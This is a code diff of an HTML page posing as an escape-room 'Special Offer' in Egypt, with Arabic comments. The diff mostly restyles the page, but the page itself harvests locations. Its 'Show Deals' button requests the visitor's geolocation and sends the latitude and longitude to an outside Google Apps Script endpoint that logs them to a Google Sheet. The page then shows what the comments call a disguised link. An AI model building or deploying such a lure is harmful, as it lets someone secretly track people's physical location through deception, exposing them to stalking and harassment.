@@ -2,11 +2,50 @@
 <html>
 <head>
   <title>Special Offer</title>
-</head>
-<body style="text-align:center; font-family:Arial; margin-top:50px;">
+  <style>
+    body {
+      text-align: center;
+      font-family: Arial;
+      margin-top: 50px;
+    }
 
-<h1>The Best & Biggest ESCAPE ROOM in Cairo!!</h1>
-<button onclick="getLocation()">See Offers</button>
+    button {
+      padding: 15px 30px;
+      font-size: 20px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+
+    button:hover {
+      transform: scale(1.1);
+    }
+
+    a.fake-link {
+      display: inline-block;
+      margin-top: 15px;
+      text-decoration: none;
+      color: #007bff;
+      font-weight: bold;
+      padding: 8px 15px;
+      border: 1px solid #007bff;
+      border-radius: 5px;
+      transition: background-color 0.2s, color 0.2s;
+    }
+
+    a.fake-link:hover {
+      background-color: #007bff;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+
+<h2>The Best & Biggest ESCAPE ROOM in Egypt!❌🔞</h2>
+<button onclick="getLocation()">Show Deals</button>
 
 <p id="output"></p>
 
@@ -23,7 +62,7 @@ function showPosition(position) {
   let lat = position.coords.latitude;
   let lon = position.coords.longitude;
 
-  // 🔥 إرسال البيانات للـ Google Sheet
+  // إرسال البيانات للـ Google Sheet
   fetch("https://script.google.com/macros/s/AKfycbwupNgq5ozs1Tvm8x4fCQZL4viiXCcrOX1tCpfxhz7YpaM6vn1X0_bEoT-zw3e4WKTotg/exec", {
     method: "POST",
     body: JSON.stringify({
@@ -32,16 +71,14 @@ function showPosition(position) {
     })
   });
 
-  // عرض البيانات على الصفحة
+  // عرض النتائج مع لينك مخفي الاسم
   document.getElementById("output").innerHTML =
     "📍 Location captured & saved ✔️<br><br>" +
-    "Latitude: " + lat + "<br>Longitude: " + lon + "<br><br>" +
-    "<a target='_blank' href='https://www.google.com/maps?q=" + lat + "," + lon + "'>Open in Google Maps</a>";
+    "<a class='fake-link' target='_blank' href='https://www.google.com/maps?q=" + lat + "," + lon + "'>View on Map</a>";
 }
 
 function showError(error) {
-  document.getElementById("output").innerHTML =
-    "❌ Location access denied";
+  document.getElementById("output").innerHTML = "❌ Location access denied";
 }
 </script>
 
